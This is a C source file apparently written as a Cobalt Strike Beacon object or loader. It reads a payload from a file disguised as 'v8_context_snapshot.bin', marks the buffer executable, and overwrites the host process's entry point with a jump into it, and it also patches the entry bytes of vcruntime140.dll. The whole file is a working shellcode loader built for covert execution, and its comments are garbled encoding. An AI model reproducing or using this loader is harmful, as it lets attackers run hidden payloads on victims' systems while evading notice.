#include <windows.h>
#include "beacon.h"

void(*PBeaconDataParse)(datap * parser, char * buffer, int size) = BeaconDataParse;
int(*PBeaconDataInt)(datap * parser) = BeaconDataInt;
short(*PBeaconDataShort)(datap * parser) = BeaconDataShort;
int(*PBeaconDataLength)(datap * parser) = BeaconDataLength;
char*(*PBeaconDataExtract)(datap * parser, int * size) = BeaconDataExtract;
void(*PBeaconFormatAlloc)(formatp * format, int maxsz) = BeaconFormatAlloc;
void(*PBeaconFormatReset)(formatp * format) = BeaconFormatReset;
void(*PBeaconFormatFree)(formatp * format) = BeaconFormatFree;
void(*PBeaconFormatAppend)(formatp * format, char * text, int len) = BeaconFormatAppend;
void(*PBeaconFormatPrintf)(formatp * format, char * fmt, ...) = BeaconFormatPrintf;
char*(*PBeaconFormatToString)(formatp * format, int * size) = BeaconFormatToString;
void(*PBeaconFormatInt)(formatp * format, int value) = BeaconFormatInt;
void(*PBeaconPrintf)(int type, char * fmt, ...) = BeaconPrintf;
void(*PBeaconOutput)(int type, char * data, int len) = BeaconOutput;
BOOL(*PBeaconUseToken)(HANDLE token) = BeaconUseToken;
void(*PBeaconRevertToken)() = BeaconRevertToken;
BOOL(*PBeaconIsAdmin)() = BeaconIsAdmin;
void(*PBeaconGetSpawnTo)(BOOL x86, char * buffer, int length) = BeaconGetSpawnTo;
void(*PBeaconInjectProcess)(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len) = BeaconInjectProcess;
void(*PBeaconInjectTemporaryProcess)(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len) = BeaconInjectTemporaryProcess;
void(*PBeaconCleanupProcess)(PROCESS_INFORMATION * pInfo) = BeaconCleanupProcess;
BOOL(*PtoWideChar)(char * src, wchar_t * dst, int max) = toWideChar;

void* myMemcpy(void* dest, const void* src, size_t n) {
    char* pDest = (char*)dest;
    const char* pSrc = (const char*)src;
    for (size_t i = 0; i < n; ++i) {
        *pDest++ = *pSrc++;
    }
    return dest;
}

int begin(char* param)
{
    LPCSTR fileName = "v8_context_snapshot.bin"; // �滻ΪҪ��ȡ�Ķ������ļ���

    // ���ļ�
    HANDLE hFile = CreateFile(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 1;
    }

    // ��ȡ�ļ���С
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return 1;
    }

    // ��ȡ�ļ�����
    HANDLE hHeap = GetProcessHeap();
    LPVOID buffer = HeapAlloc(hHeap, 0, fileSize);

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        CloseHandle(hFile);
        return 1;
    }

    HMODULE ImageBase = GetModuleHandle(NULL);

    PIMAGE_DOS_HEADER  pDH = NULL;//ָ��IMAGE_DOS�ṹ��ָ��
    PIMAGE_NT_HEADERS  pNtH = NULL;//ָ��IMAGE_NT�ṹ��ָ��
    PIMAGE_FILE_HEADER pFH = NULL;;//ָ��IMAGE_FILE�ṹ��ָ��
    PIMAGE_OPTIONAL_HEADER pOH = NULL;//ָ��IMAGE_OPTIONALE�ṹ��ָ��

    //IMAGE_DOS Header�ṹָ��
    pDH = (PIMAGE_DOS_HEADER)ImageBase;
    //IMAGE_NT Header�ṹָ��
    pNtH = (PIMAGE_NT_HEADERS)((DWORD)pDH + pDH->e_lfanew);
    //IMAGE_File Header�ṹָ��
    pFH = &pNtH->FileHeader;
    //IMAGE_Optional Header�ṹָ��
    pOH = &pNtH->OptionalHeader;

    DWORD dwOEP = pOH->AddressOfEntryPoint;    // ����ִ����ڵ�ַ
    dwOEP = (DWORD)(pOH->ImageBase + dwOEP);   // ӳ����ʼ��ַ+ִ����ڵ�ַ

    DWORD dwOld;
    VirtualProtect((LPVOID)buffer, fileSize, PAGE_EXECUTE_READWRITE, &dwOld);

    VirtualProtect((LPVOID)dwOEP, 0x1000, PAGE_EXECUTE_READWRITE, &dwOld);
    *(PBYTE)dwOEP = 0xE9;
    *(PDWORD)(dwOEP + 1) = (DWORD)buffer - dwOEP - 5;
    VirtualProtect((LPVOID)dwOEP, 0x1000, dwOld, &dwOld);

    HMODULE dllImageBase = GetModuleHandle("vcruntime140.dll");
    pDH = (PIMAGE_DOS_HEADER)dllImageBase;
    pNtH = (PIMAGE_NT_HEADERS)((DWORD)pDH + pDH->e_lfanew);
    pFH = &pNtH->FileHeader;
    pOH = &pNtH->OptionalHeader;

    dwOEP = pOH->AddressOfEntryPoint;    // ����ִ����ڵ�ַ
    dwOEP = (DWORD)(pOH->ImageBase + dwOEP);   // ӳ����ʼ��ַ+ִ����ڵ�ַ

    VirtualProtect((LPVOID)dwOEP, 0x1000, PAGE_EXECUTE_READWRITE, &dwOld);
    *(PBYTE)(dwOEP + 0) = 0x55;
    *(PBYTE)(dwOEP + 1) = 0x8b;
    *(PBYTE)(dwOEP + 2) = 0xec;
    *(PBYTE)(dwOEP + 3) = 0x83;
    *(PBYTE)(dwOEP + 4) = 0x7d;
    VirtualProtect((LPVOID)dwOEP, 0x1000, dwOld, &dwOld);

    // �ͷ���Դ
    CloseHandle(hFile);

	return 0;
}

void strat(LPVOID param)
{
	begin(param);
}